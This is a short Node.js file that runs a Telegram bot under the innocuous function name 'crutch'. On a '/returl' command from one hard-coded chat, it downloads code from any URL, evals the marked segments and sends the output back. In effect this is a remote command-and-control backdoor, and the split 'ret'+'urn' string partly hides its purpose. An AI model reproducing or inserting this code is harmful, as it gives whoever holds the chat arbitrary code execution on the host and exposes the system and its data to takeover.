function crutch() {
  process.env["NTBA_FIX_319"] = 1;
  D = {};
  F = {}; 
  S = {};
  F.bot = new(require('node-telegram-bot-api'))(process.env.TOKEN, {
    polling: true
  });

D.port = 80;
D.chatPort = 2000; 
D.mainChat = "-1001609661635";
  F.bot.onText(/\/returl (.+)/, (msg, match) => {
    if (msg.chat.id + ""  == D.mainChat) {
      var url = match[1];
      var http = require('http'),
        https = require('https');
      var client = http;
      if (url.toString().indexOf("https") === 0) {
        client = https;
      }
      client.get(url, (resp) => {
        var data = '';
        resp.on('data', (chunk) => {
          data += chunk;
        });
        resp.on('end', () => {
          data.split('/ret' + 'urn').forEach((item, i, arr) => {
            i % 2 && F.bot.sendMessage(msg.chat.id,
              JSON.stringify(eval('try {eval(item)} catch(e) {e.message}')), {
              reply_to_message_id: msg.message_id
            });
          })
        });
      }).on("error", (err) => {
        F.bot.sendMessage(msg.chat.id, err + 'err');
      });
    }
  });
}
crutch();
